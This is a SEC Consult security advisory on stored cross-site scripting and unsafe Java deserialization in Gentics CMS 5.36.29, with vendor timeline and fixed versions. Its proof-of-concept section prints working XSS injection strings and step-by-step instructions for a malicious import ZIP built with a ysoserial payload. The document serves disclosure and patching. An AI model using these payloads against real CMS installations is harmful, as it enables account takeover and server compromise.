@@ -1,0 +1,212 @@
+id: 37802
+date: 06/21/2022
+title: Gentics CMS 5.36.29 Cross Site Scripting / Deserialization Vulnerability
+author: Steffen Robertz
+cves: CVE-2022-30981, CVE-2022-30982
+
+=======================================================================
+               title: Stored Cross-Site Scripting & Unsafe Java Deserializiation
+             product: Gentics CMS
+  vulnerable version: 5.36.29, see section below
+       fixed version: 5.40.27, 5.41.15, 5.42.7, 5.43.1 or higher
+          CVE number: CVE-2022-30981, CVE-2022-30982
+              impact: high
+            homepage: https://www.gentics.com/
+               found: 2021-04-02
+                  by: Gerhard Hechenberger (Office Vienna)
+                      Steffen Robertz (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"APA-IT Informations Technologie GmbH offers offers support with a focus on
+media solutions and IT-outsourcing. As a subsidiary of APA – Austria Press
+Agency, we are responsible for the IT of the Austrian news agency as well
+as numerous other media enterprises.
+This expertise and insight into the industry make APA-IT an expert for IT
+solutions for publishers and media-related companies. Existing systems and
+tools are constantly developed and tailored to individual customer needs.
+As such, APA-IT is always available – from conception to operation."
+
+Source: https://www.gentics.com/genticscms/company_gentics.en.html
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult recommends to perform a thorough security review of these products
+conducted by security professionals to identify and resolve all security
+issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Multiple Stored Cross-Site Scripting Vulnerabilities (CVE-2022-30982)
+Multiple cross-site scripting vulnerabilities are present in the application.
+An attacker can store malicious JavaScript code in the username and profile
+description. The code will execute once an admin user hovers over the
+attacker's username. Thus, the attacker can execute code in the context of an
+admin.
+
+2) Unsafe Java Deserialization (CVE-2022-30981)
+The Gentics CMS has an import option which will accept ZIP files. The archive
+includes a Java serialized object that gets deserialized on import. This can
+lead to code execution on the server.
+A low privileged user might be able to exploit this vulnerability by chaining
+it together with vulnerability 1).
+
+
+Proof of concept:
+-----------------
+1) Multiple Stored Cross-Site Scripting Vulnerabilities (CVE-2022-30982)
+To trigger the first XSS, an attacker has to change the profile description to
+include a payload, e.g. "<script>alert(document.domain)</script)". The payload
+will execute once a user with access to the userlist hovers his mouse over the
+profile name. The event "onmouseover" will trigger following code:
+
+JSI3_comp_list_401__ass( this, 'Properties', '<b>Malicious User Name</b><br>
+<script>alert(document.domain)</script><br><br>created:<br> 09/20/2002
+( Gentics Support)<br>last edited:<br>15:56 (Malicious Username)', '' );
+
+The execution of the code leads to following function:
+
+function JSI3_comp_list_401__ass( obj, title, text, assTitle )
+{
+  JSI3_comp_list_401__assReset();
+  clearTimeout( JSI3_comp_list_401___ass_timeout );
+  JSI3_comp_list_401__ass_show_row( obj, title, text, assTitle );
+}
+
+The malicious code, which is contained in the "text" parameter, gets passed
+through to the next function. There it is added to an HTML element and thus
+executed in the browser.
+
+function JSI3_comp_list_401__ass_show_row( obj, title, text, assTitle ) {
+  if (!JSI3_comp_list_401__ass_show_row_tipsy[obj.id]) {
+    JSI3_comp_list_401__ass_show_row_tipsy[obj.id] = true;
+    $(obj).attr('title', '<h6>'+title+'</h6>'+text+((assTitle)?'<br>'+assTitle:''));
+    $(obj).tipsy({
+      trigger: 'manual',
+      html: true,
+      offset: 3,
+      delayIn: 900,
+      delayOut: 0,
+      opacity: 0.85,
+      gravity: 'nww'
+    });
+  }
+  $(obj).tipsy("show");
+  gcn_active_tipsy = obj;
+}
+
+
+Another XSS vector can be found in the parameters "First Name" and "Last Name".
+By e.g. changing the last name to 'Node" onload="alert(document.domain)',
+JavaScript code is added to the profile picture that is loaded in the upper
+right corner on every page. The following snippet shows the vulnerable line of
+code:
+
+<div id="profil">
+<div><img src="?do=11&module=system&img=profile_man.png" title="Admin Node" onload="alert(document.domain)" class="profile_avatar"></div>
+
+
+The third XSS is caused by changing the first and last name into JavaScript
+code without prior encoding. Changing the last name to
+"Last Name'+eval(alert(document.domain))+'" will cause the following code to be
+included in the server's response:
+
+<script language="JavaScript" type="text/javascript">
+  var menus = new Array();
+  var imgs = new Array();
+  menus['Admin Last Name'+eval(alert(document.domain))+''] = new Array();
+  menus['Admin Last Name'+eval(alert(document.domain))+'']['layer_pos'] = 1;
+  menus['Admin Last Name'+eval(alert(document.domain))+'']['align'] = 'r';
+
+
+2) Unsafe Java Deserialization (CVE-2022-30981)
+First, a malicious ZIP archive needs to be created. The following files will need to
+be included within this archive:
+
+bundlebuild.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<bundlebuild>
+  <bundleinfo>
+    <name><![CDATA[test4]]></name>
+    <sourcehost><![CDATA[b1d80757b76c]]></sourcehost>
+    <description><![CDATA[]]></description>
+    <globalid>9d6243ab-a281-11eb-9ae3-0242ac130004</globalid>
+    <globalprefix>D77D</globalprefix>
+  </bundleinfo>
+  <builds>
+    <build>
+      <builddate>1618996405</builddate>
+      <changelog><![CDATA[test4]]></changelog>
+      <count>0</count>
+    </build>
+  </builds>
+  <tables>
+  </tables>
+</bundlebuild>
+
+containedobjects.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<objects>
+</objects>
+
+
+The third file has to be named "serializedjava.bin" and contains the actual
+payload. A demo payload can be generated with following command:
+$ ysoserial FileUpload1 'write;/tmp;SECTEST' > serializedjava.bin
+
+Those three files have to be zipped together into an archive, which can be
+uploaded.
+
+The import feature is available under Enterprise CMS -> Administration ->
+Import and Export. Now select New->Import and upload the malicious ZIP archive.
+Wait until the import completed. Now click on "Test succeeded" in the file
+list. On the new screen select "Start import in background". The payload should
+create a file called "upload_<random_uuid>.tmp" in the folder /tmp. It will
+contain the string "SECTEST".
+Better deserialization chains could be built to reach more interesting targets.
+It is very likely, that RCE could be obtained by writing an own deserialization
+chain.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following product version has been tested and found to be vulnerable. Other versions
+are vulnerable as well, please see the vendor's changelog in the solution section.
+
+* Gentics CMS 5.36.29
+
+
+
+Vendor contact timeline:
+------------------------
+2022-04-04: Contacting vendor through support@gentics.com
+2022-04-04: Ticket SUP-13323 created.
+2022-04-05: Sent advisory via unencrypted email to provided vendor email address.
+2022-05-04: Updates for Gentics CMS were released on 14th April.
+2022-05-05: Gentics provides us with the fixed version numbers.
+2022-06-08: Release of security advisory.
+
+
+Solution:
+---------
+Update to versions greater or equal to:
+* 5.40.27 (see https://gentics.com/Content.Node/changelog/5.40.0/5.40.27.html)
+* 5.41.15 (see https://gentics.com/Content.Node/changelog/5.41.0/5.41.15.html)
+* 5.42.7 (see https://gentics.com/Content.Node/changelog/5.42.0/5.42.7.html)
+* 5.43.1 (see https://gentics.com/Content.Node/changelog/5.43.0/5.43.1.html)
+
+#  0day.today [2023-03-23]  #
